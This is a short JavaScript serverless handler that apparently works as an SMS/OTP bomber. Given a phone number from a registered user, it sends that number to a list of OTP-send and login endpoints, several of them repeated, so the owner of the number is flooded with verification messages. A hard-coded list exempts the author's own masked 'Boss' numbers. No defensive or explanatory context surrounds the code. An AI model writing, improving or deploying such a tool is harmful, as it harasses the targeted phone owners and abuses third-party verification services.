import { USERS } from "./users.js";

export default async function handler(req,res){

 const {number,id} = req.query;

 if(!number)
  return res.json({ok:false,msg:"number required"});

 /* Protected numbers */
 const PROTECTED = [
  "01760******",
  "01995******",
  "01762******"
 ];

 if(PROTECTED.includes(number)){
  return res.json({ok:false,msg:"He is my Boss😈"});
 }

 const user = USERS.find(u=>u.id===id);

 if(!user)
  return res.json({ok:false,msg:"Invalid user"});

 if(!user.status)
  return res.json({ok:false,msg:"Account Offline"});

 const APIS=[
    "https://vercel.app/send-otp",
    "https://vercel.app/verify-phone",
    "https://vercel.app/shikho-send-otp",
    "https://vercel.app/bondi-login",
    "https://vercel.app/bioscope-login",
    "https://vercel.app/send-otp",
    "https://vercel.app/send-otp",
    "https://vercel.app/send-otp"
 ];

 for(const api of APIS){
  try{
   await fetch(`${api}?number=${encodeURIComponent(number)}`);
  }catch(e){}
 }

 res.json({ok:true});

}
